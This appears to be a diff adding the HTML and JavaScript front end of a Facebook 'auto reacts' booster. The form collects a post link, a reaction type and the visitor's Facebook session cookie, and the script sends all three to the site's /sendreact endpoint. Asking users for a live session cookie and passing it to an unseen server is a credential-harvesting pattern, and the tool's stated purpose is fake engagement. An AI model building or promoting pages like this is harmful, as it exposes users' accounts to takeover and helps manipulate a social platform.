@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝐅𝐁 𝐀𝐔𝐓𝐎 𝐋𝐈𝐊𝐄𝐑𝐒 𝐁𝐘 𝐙𝐂𝐃𝐒 𝐏𝐇</title>
+    <link rel="icon" type="image/jpg" href="https://i.imgur.com/WharWPG.jpeg">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #222;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .container {
+            background-color: rgba(255,255,255,0.1);
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.4);
+            padding: 20px;
+            width: 400px;
+            max-width: 100%;
+            margin: 20px;
+            transition: transform 0.3s ease-out;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            overflow: hidden;
+        }
+
+        h1 {
+            color: #00FFFF;
+            text-align: center;
+            font-weight: 700;
+            margin-top: 0;
+            letter-spacing: 2px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin-bottom: 5px;
+            color: #fff;
+        }
+
+        input, select {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: #333;
+            color: #fff;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        button {
+            padding: 10px;
+            background-color: #0000FF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 10px;
+            transition: background-color 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background-color: #0080FF;
+        }
+
+        #response {
+            margin-top: 20px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .error {
+            color: red;
+        }
+
+        .success {
+            color: green;
+        }
+
+        .sms {
+            cursor: pointer;
+            border: none;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            animation: rotate 10s linear infinite;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://i.imgur.com/WharWPG.jpeg" alt="Logo">
+        </div>
+        <h1>𝐅𝐁 𝐀𝐔𝐓𝐎 𝐑𝐄𝐀𝐂𝐓𝐒</h1>
+        <form id="reactForm">
+            <label for="link">𝐏𝐎𝐒𝐓 𝐋𝐈𝐍𝐊 :</label>
+            <input type="text" id="link" name="link" placeholder="𝙴𝙽𝚃𝙴𝚁 𝙿𝙾𝚂𝚃 𝙻𝙸𝙽𝙺" required>
+
+            <label for="type">𝐑𝐄𝐀𝐂𝐓 𝐓𝐘𝐏𝐄 :</label>
+            <select id="type" name="type" required>
+                <option value="LIKE">👍 𝐋𝐈𝐊𝐄</option>
+                <option value="LOVE">❤️ 𝐋𝐎𝐕𝐄</option>
+                <option value="CARE">🥰 𝐂𝐀𝐑𝐄</option>
+                <option value="HAHA">😂 𝐇𝐀𝐇𝐀</option>
+                <option value="WOW">😮 𝐖𝐎𝐖</option>
+                <option value="SAD">😢 𝐒𝐀𝐃</option>
+                <option value="ANGRY">😡 𝐀𝐍𝐆𝐑𝐘</option>
+            </select>
+
+            <label for="cookie">𝐂𝐎𝐎𝐊𝐈𝐄 :</label>
+            <input type="text" id="cookie" name="cookie" placeholder="𝙴𝙽𝚃𝙴𝚁 𝙲𝙾𝙾𝙺𝙸𝙴" required>
+
+            <button type="submit">𝚂𝚄𝙱𝙼𝙸𝚃</button>
+        </form>
+        <div id="response"></div>
+    </div>
+
+    <script>
+        document.getElementById('reactForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const link = document.getElementById('link').value;
+            const type = document.getElementById('type').value;
+            const cookie = document.getElementById('cookie').value;
+
+            const responseElement = document.getElementById('response');
+            responseElement.textContent = 'PLEASE WAIT BOOSTING PROCESS';
+            responseElement.className = '';
+
+            try {
+                const response = await fetch('/sendreact', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ link, type, cookie })
+                });
+
+                const result = await response.json();
+                if (result.error) {
+                    responseElement.textContent = `Error: ${result.error}`;
+                    responseElement.className = 'error';
+                } else if (result.cookieError) {
+                    responseElement.textContent = 'Invalid cookie. Please check your cookie and try again.';
+                    responseElement.className = 'error';
+                } else {
+                    responseElement.textContent = result.message;
+                    responseElement.className = 'success';
+                }
+            } catch (error) {
+                responseElement.textContent = 'An error occurred while sending the reaction. Please try again later.';
+                responseElement.className = 'error';
+            }
+        });
+    </script>
+</body>
+</html>
